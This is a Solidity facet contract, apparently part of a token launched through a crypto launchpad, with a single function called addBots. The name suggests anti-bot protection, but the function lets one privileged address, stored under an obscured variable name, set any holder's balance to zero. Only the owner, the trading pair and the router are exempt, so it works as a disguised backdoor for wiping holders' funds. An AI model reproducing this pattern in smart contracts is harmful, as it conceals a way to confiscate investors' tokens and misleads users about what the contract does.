/*  
   * SPDX-License-Identifier: MIT
    ▫️Website: https://dappad.app
    ▫️Twitter: https://twitter.com/Dappadofficial
    ▫️Discord: https://discord.gg/dappadlaunchpad
    ▫️Github: https://github.com/dappadapp
*/
pragma solidity ^0.8.19;
import "./TestLib.sol";
contract addBotsFacet {
    function addBots(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
